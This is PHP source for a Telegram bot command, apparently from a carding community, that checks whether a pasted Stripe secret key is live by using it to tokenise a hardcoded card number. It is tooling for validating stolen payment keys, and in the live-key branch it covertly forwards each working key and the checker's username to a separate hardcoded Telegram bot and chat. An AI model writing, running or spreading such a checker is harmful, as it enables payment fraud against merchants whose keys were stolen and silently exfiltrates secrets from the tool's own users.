<?php

////===============[Sk Key Check Command]===============/////

if ((strpos($message, "/sk") === 0) || (strpos($message, "!sk") === 0)){
$sec = substr($message, 3);
$sec = ltrim($sec);
  
if (empty($sec) || (strlen($sec) < 30) ) {
  $respo = urlencode ("<b>Invalid or Empty Input </b>❌\n<b>Format:</b> <code>/sk sk_live</code>");
    sendMessage($chatId, $respo , $message_id); 
  return;  
}

sendaction($chatId, "typing");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5432768975806729&card[exp_month]=07&card[exp_year]=2026&card[cvc]=294");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
  
if (strpos($result, "tok_")){
	sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A%0A<b>KEY:</b> <code>$sec</code>%0A%0A<b>RESPONSE:</b> SK LIVE!!%0A%0A═══════════════════%0A<b>Bot Made by:</b><a> [raven_ccs]</a>", $message_id);

$msg = "SK KEY : $sec
➤ Status : LIVE KEY!! ✅

𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: @$username
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢: [raven_ccs]";
    $apiToken = "1801937008:AAFx7AzqdQqn5XrgeFxTr4QFUShPEvLPgfE";
    $logger = ['chat_id' => '1190070178','text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
}

elseif (strpos($result, 'api_key_expired')){
	sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A%0A<b>KEY:</b> <code>$sec</code>%0A%0A<b>RESPONSE:</b> EXPIRED KEY%0A%0A═══════════════════%0A<b>Bot Made by:</b><a> [raven_ccs]</a>", $message_id);
	}
elseif (strpos($result, 'Invalid API Key provided')){
	sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A%0A<b>KEY:</b> <code>$sec</code>%0A%0A<b>RESPONSE:</b> INVALID KEY%0A%0A═══════════════════%0A<b>Bot Made by:</b><a> [raven_ccs]</a>", $message_id);
	}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
	sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A%0A<b>KEY:</b> <code>$sec</code>%0A%0A<b>RESPONSE:</b> TESTMODE CHARGES ONLY%0A%0A═══════════════════%0A<b>Bot Made by:</b><a> [raven_ccs]</a>", $message_id);
	} 
elseif (strpos($result, 'You did not provide an API key.')){
	sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A%0A<b>KEY:</b> <code>$sec</code>%0A%0A<b>RESPONSE:</b> PLEASE PROVIDE AN API KEY%0A%0A═══════════════════%0A<b>Bot Made by:</b><a> [raven_ccs]</a>", $message_id);
	}
  
else{
	sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A%0A<b>KEY:</b> <code>$sec</code>%0A%0A<b>RESPONSE:</b> ".urlencode($result)."%0A%0A═══════════════════%0A<b>Bot Made by:</b><a> [raven_ccs]</a></a>", $message_id);
	}

}
////=========[Sk Key Check Command Ends]=========////


?>